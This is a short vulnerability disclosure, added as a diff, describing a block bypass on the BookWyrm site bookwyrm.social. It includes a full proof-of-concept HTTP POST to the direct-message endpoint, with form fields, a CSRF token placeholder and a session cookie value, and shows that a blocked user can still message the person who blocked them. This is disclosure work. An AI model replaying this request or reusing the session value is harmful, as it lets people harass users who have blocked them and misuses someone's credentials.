@@ -1,0 +1,60 @@
+1.USerA block userB 
+2.UserB send direct request to message endpoint with userA''s userID
+
+
+# Poc
+POST https://bookwyrm.social/post/direct
+Host: bookwyrm.social
+User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0
+Accept: application/json
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Referer: https://bookwyrm.social/direct-messages/alizo2
+Content-Type: multipart/form-data; boundary=---------------------------63531825311408735291403048175
+Origin: https://bookwyrm.social
+Content-Length: 940
+DNT: 1
+Connection: keep-alive
+Cookie: csrftoken=; django_language=None; sessionid=suokqtn2cfu01jpoys18vni112ndmzjr
+Sec-Fetch-Dest: empty
+Sec-Fetch-Mode: no-cors
+Sec-Fetch-Site: same-origin
+TE: trailers
+Pragma: no-cache
+Cache-Control: no-cache
+
+-----------------------------63531825311408735291403048175
+Content-Disposition: form-data; name="csrfmiddlewaretoken"
+
+token
+-----------------------------63531825311408735291403048175
+Content-Disposition: form-data; name="book"
+
+
+-----------------------------63531825311408735291403048175
+Content-Disposition: form-data; name="user"
+
+id
+-----------------------------63531825311408735291403048175
+Content-Disposition: form-data; name="reply_parent"
+
+
+-----------------------------63531825311408735291403048175
+Content-Disposition: form-data; name="content"
+
+@Victim's Username   message
+-----------------------------63531825311408735291403048175
+Content-Disposition: form-data; name="content_warning"
+
+
+-----------------------------63531825311408735291403048175
+Content-Disposition: form-data; name="privacy"
+
+direct
+-----------------------------63531825311408735291403048175--
+
+
+
+# Impact
+
+Sending message to a user even if he blocked  a specific user 
